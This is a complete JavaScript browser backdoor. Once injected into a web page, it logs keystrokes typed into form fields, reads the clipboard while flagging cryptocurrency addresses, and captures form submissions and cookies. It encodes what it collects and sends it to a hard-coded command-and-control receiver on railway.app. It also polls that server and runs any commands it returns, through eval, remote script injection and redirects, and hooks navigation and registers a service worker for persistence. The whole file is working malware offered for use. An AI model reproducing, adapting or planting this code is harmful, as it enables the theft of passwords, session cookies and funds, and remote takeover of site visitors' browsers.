(function() {
    'use strict';

    // ===== CONFIG — YOUR RECEIVER URL =====
    const CONFIG = {
        C2_SERVER: 'https://verdant-frangipane-b8d9fd-production.up.railway.app/',  // ← YOUR RECEIVER
        HEARTBEAT_INTERVAL: 30000,
        BACKUP_DOMAINS: [],
        SESSION_KEY: '_bckdr_sid',
        COMMAND_ENDPOINT: '/cmd',
        DATA_ENDPOINT: '/exfil'
    };
    // =====================================

    // ===== PERSISTENCE =====
    function persist() {
        if (!localStorage.getItem(CONFIG.SESSION_KEY)) {
            const sid = btoa(Date.now() + '-' + Math.random());
            localStorage.setItem(CONFIG.SESSION_KEY, sid);
        }
        if ('serviceWorker' in navigator) {
            try {
                navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(() => {});
            } catch(e) {}
        }
        const originalPushState = history.pushState;
        history.pushState = function() {
            originalPushState.apply(this, arguments);
            setTimeout(phoneHome, 100);
        };
    }

    // ===== KEYLOGGER =====
    function startKeylogger() {
        let buffer = '';
        document.addEventListener('keydown', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.contentEditable === 'true') {
                buffer += e.key;
            }
        });
        setInterval(() => {
            if (buffer.length > 0) {
                exfiltrate({ type: 'keystrokes', data: buffer, target: document.activeElement?.name || 'unknown' });
                buffer = '';
            }
        }, 5000);
    }

    // ===== CLIPBOARD MONITOR =====
    function startClipboardMonitor() {
        let lastClip = '';
        setInterval(async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text && text !== lastClip) {
                    lastClip = text;
                    const cryptoPatterns = {
                        btc: /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/,
                        eth: /^0x[a-fA-F0-9]{40}$/,
                        sol: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
                    };
                    let detected = 'unknown';
                    for (const [type, pattern] of Object.entries(cryptoPatterns)) {
                        if (pattern.test(text)) { detected = type; break; }
                    }
                    exfiltrate({ type: 'clipboard', data: text, detected: detected });
                }
            } catch(e) {}
        }, 2000);
    }

    // ===== FORM CAPTURE =====
    function captureForms() {
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const data = new FormData(form);
            const payload = {};
            for (const [key, value] of data.entries()) {
                payload[key] = value;
            }
            exfiltrate({ type: 'form_submit', action: form.action || location.href, data: payload });
        });
    }

    // ===== EXFILTRATION =====
    function exfiltrate(data) {
        const payload = {
            session: localStorage.getItem(CONFIG.SESSION_KEY),
            url: location.href,
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            cookies: document.cookie,
            data: data
        };
        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
        sendData(CONFIG.C2_SERVER + CONFIG.DATA_ENDPOINT, encoded);
        CONFIG.BACKUP_DOMAINS.forEach(domain => {
            sendData(domain + CONFIG.DATA_ENDPOINT, encoded);
        });
    }

    function sendData(url, data) {
        try {
            navigator.sendBeacon(url, data);
            const img = new Image();
            img.src = url + '?' + data.slice(0, 2000);
            fetch(url, { method: 'POST', body: data, headers: { 'Content-Type': 'text/plain' }, mode: 'no-cors' }).catch(() => {});
        } catch(e) {}
    }

    // ===== COMMAND & CONTROL =====
    async function phoneHome() {
        try {
            const sid = localStorage.getItem(CONFIG.SESSION_KEY);
            const response = await fetch(CONFIG.C2_SERVER + CONFIG.COMMAND_ENDPOINT + '?sid=' + sid, {
                method: 'GET',
                headers: { 'Cache-Control': 'no-cache' }
            });
            if (response.ok) {
                const commands = await response.json();
                if (commands && commands.length > 0) {
                    commands.forEach(cmd => {
                        try {
                            switch(cmd.type) {
                                case 'eval': eval(cmd.code); break;
                                case 'inject': const s = document.createElement('script'); s.src = cmd.url; document.head.appendChild(s); break;
                                case 'redirect': location.href = cmd.url; break;
                                case 'alert': alert(cmd.message); break;
                                case 'fetch': fetch(cmd.url, cmd.options || {}).then(r => r.text()).then(data => { exfiltrate({ type: 'fetch_result', data: data }); }); break;
                            }
                        } catch(e) {}
                    });
                }
            }
        } catch(e) {}
    }

    function startHeartbeat() {
        phoneHome();
        setInterval(phoneHome, CONFIG.HEARTBEAT_INTERVAL);
    }

    // ===== INIT =====
    function init() {
        persist();
        startKeylogger();
        startClipboardMonitor();
        captureForms();
        startHeartbeat();
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = CONFIG.C2_SERVER + 'keepalive.html';
        document.body.appendChild(iframe);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();